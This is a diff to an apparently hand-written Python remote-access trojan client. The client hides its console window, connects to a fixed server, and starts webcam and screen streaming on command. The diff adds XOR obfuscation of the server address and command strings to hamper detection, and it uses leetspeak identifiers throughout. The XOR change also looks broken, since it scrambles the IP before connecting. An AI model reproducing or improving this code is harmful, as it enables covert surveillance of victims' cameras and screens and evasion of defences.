@@ -11,13 +11,20 @@ import sys
 import random
 import string
 
+# XOR encryption and decryption
+def xor_encrypt_decrypt(data, key):
+    return ''.join([chr(ord(c) ^ key) for c in data])
+
+# XOR key for encryption
+XOR_KEY = 123  # Choose a key for XOR encryption (ensure it's a single byte)
+
 # Function to hide the console window
-def h0id3_c0ns0l3():
+def h1d3_c0ns0l3():
     if sys.platform == "win32":
         ctypes.windll.kernel32.FreeConsole()
 
 # Connect to the server
-S3RV3R_IP = "10.0.1.33"  # Replace with the server IP address
+S3RV3R_IP = xor_encrypt_decrypt("10.0.1.33", XOR_KEY)  # Encrypted server IP
 S3RV3R_P0RT = 9999
 cl1nt_s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -53,9 +60,9 @@ def r3c31v3_c0mm4nds():
         if not c0mm4nd:
             break
         print(f"R3c31v3d C0mm4nd: {c0mm4nd}")
-        if c0mm4nd == "!webcam_stream":
+        if xor_encrypt_decrypt(c0mm4nd, XOR_KEY) == "!webcam_stream":
             threading.Thread(target=s3nd_w3bc4m).start()
-        elif c0mm4nd == "!screen_stream":
+        elif xor_encrypt_decrypt(c0mm4nd, XOR_KEY) == "!screen_stream":
             threading.Thread(target=s3nd_scr33n).start()
 
 # Connect to the server and start receiving commands
@@ -70,5 +77,5 @@ def st4rt_cl1nt():
 
 # Main function to run the client
 if __name__ == "__main__":
-    h0id3_c0ns0l3()  # Hide the console window to run in the background
+    h1d3_c0ns0l3()  # Hide the console window to run in the background
     st4rt_cl1nt()
